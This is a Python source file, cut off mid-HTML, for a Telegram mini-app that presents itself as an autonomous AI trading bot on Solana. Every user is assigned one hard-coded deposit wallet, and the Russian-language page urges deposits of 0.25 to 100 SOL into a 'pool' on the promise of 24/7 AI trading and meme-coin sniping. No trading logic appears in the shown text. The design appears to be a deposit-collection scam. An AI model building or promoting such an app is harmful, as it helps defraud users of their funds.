import asyncio
import aiohttp
from aiohttp import web
import sqlite3
import os
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
PORT = int(os.getenv("PORT", 10000))
RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://zer0lifeautopilot-bot.onrender.com")
DB_FILE = "zer0life_users.db"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"

SHARED_DEPOSIT_WALLET = "8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"
MIN_DEPOSIT_SOL = 0.25
MAX_DEPOSIT_SOL = 100.0

TOKENS = {
    "SOL": "So11111111111111111111111111111111111111112",
    "USDC": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
    "MEME_HOT": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            solana_wallet TEXT,
            trading_active INTEGER DEFAULT 0,
            trade_mode TEXT DEFAULT 'SOL_USDC',
            trade_amount_sol REAL DEFAULT 0.05,
            slippage_bps INTEGER DEFAULT 150,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def get_or_create_user(telegram_id: int, username: str, first_name: str):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps FROM users WHERE telegram_id = ?", (telegram_id,))
    row = cursor.fetchone()
    
    if not row:
        cursor.execute("INSERT INTO users (telegram_id, username, first_name, solana_wallet, trading_active, trade_mode, trade_amount_sol, slippage_bps) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", 
                       (telegram_id, username, first_name, SHARED_DEPOSIT_WALLET, 0, 'SOL_USDC', 0.05, 150))
        conn.commit()
        user = {"telegram_id": telegram_id, "username": username, "first_name": first_name, "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": 0, "trade_mode": 'SOL_USDC', "trade_amount_sol": 0.05, "slippage_bps": 150}
    else:
        user = {"telegram_id": row[0], "username": row[1], "first_name": row[2], "solana_wallet": SHARED_DEPOSIT_WALLET, "trading_active": row[4], "trade_mode": row[5], "trade_amount_sol": row[6], "slippage_bps": row[7]}
    
    conn.close()
    return user

HTML_CONTENT = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zer0Life Autonomous AI Trader</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #06080f; color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 16px; padding-bottom: 110px; }
        .card { background: #0f172a; border-radius: 18px; padding: 20px; margin-bottom: 18px; border: 1px solid #1e293b; box-shadow: 0 4px 16px rgba(0,0,0,0.4); }
        .profile-header { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
        .avatar { width: 54px; height: 54px; border-radius: 50%; object-fit: cover; border: 2px solid #7c3aed; background: #1e293b; display: none; }
        .input-field { width: 100%; background: #030712; border: 1px solid #1e293b; color: #34d399; padding: 12px 14px; border-radius: 12px; margin-top: 8px; font-family: monospace; font-size: 12px; text-align: center; outline: none; }
        .btn { background: #7c3aed; color: white; border: none; width: 100%; padding: 14px; border-radius: 14px; font-weight: 700; cursor: pointer; margin-top: 12px; font-size: 14px; }
        .btn-green { background: #10b981; }
        .btn-red { background: #ef4444; }
        .btn-purple { background: linear-gradient(135deg, #7c3aed 0%, #6d28d9 100%); }
        .btn-mode { background: #1e293b; color: #94a3b8; border: 1px solid #334155; margin-top: 6px; width: 100%; padding: 12px; border-radius: 12px; font-weight: bold; cursor: pointer;}
        .btn-mode.active { background: #7c3aed; color: white; border-color: #9333ea; }
        .metric { display: flex; justify-content: space-between; margin-top: 10px; font-size: 14px; color: #94a3b8; }
        .val { color: #34d399; font-weight: 700; font-family: monospace; }
        .logs { background: #030712; border: 1px solid #1e293b; border-radius: 12px; padding: 12px; font-family: monospace; font-size: 11px; color: #38bdf8; height: 140px; overflow-y: auto; margin-top: 10px; }
        .qr-container { text-align: center; margin: 16px 0 10px 0; }
        .qr-code { width: 130px; height: 130px; border-radius: 12px; border: 2px solid #1e293b; padding: 6px; background: white; }
        .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #1e293b; padding: 14px 16px; display: flex; gap: 12px; z-index: 100; }
        .badge { background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; text-align: center; margin-bottom: 14px; }
        #onboarding-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #06080f; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; }
    </style>
</head>
<body>
    <div id="onboarding-overlay">
        <h2 style="font-size: 24px; color: #f8fafc; margin-bottom: 8px;">Zer0Life AI Trader</h2>
        <p style="font-size: 14px; color: #94a3b8; margin-bottom: 24px;">Автономный трейдинг в сети Solana 24/7.</p>
        <button class="btn btn-purple" style="max-width: 320px;" onclick="document.getElementById('onboarding-overlay').style.display='none'">🚀 Войти в терминал</button>
    </div>

    <div class="card">
        <div class="profile-header">
            <div>
                <h2 style="margin: 0; font-size: 18px;" id="uname">Trader</h2>
                <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">ID: <span id="uid" class="val">---</span></p>
            </div>
        </div>
        <div class="badge">🔥 Pool Limit: 0.25 - 100 SOL</div>
        <label style="font-size: 12px; color: #94a3b8; font-weight: 600;">Адрес депозита экосистемы:</label>
        <input type="text" id="wallet-input" class="input-field" readonly>
        <div class="qr-container"><img class="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=8hxiCofyaKCBkhR5nsDqvUivmfgxcVx8zo2WiCzSdM6L"></div>
        <button class="btn btn-purple" onclick="navigator.clipboard.writeText(document.getElementById('wallet-input').value); alert('Скопировано!')">📋 Копировать адрес</button>
    </div>

    <div class="card">
        <h3 style="margin: 0 0 10px 0; font-size: 16px;">🎯 Режим работы</h3>
        <button id="mode-sol" class="btn btn-mode active" onclick="setMode('SOL_USDC')">💎 SOL / USDC</button>
        <button id="mode-meme" class="btn btn-mode" onclick="setMode('MEMECOIN_SNIPER')">🚀 MemeCoin AI Sniper</button>
    </div>

    <div class="card">
        <h3 style="margin: 
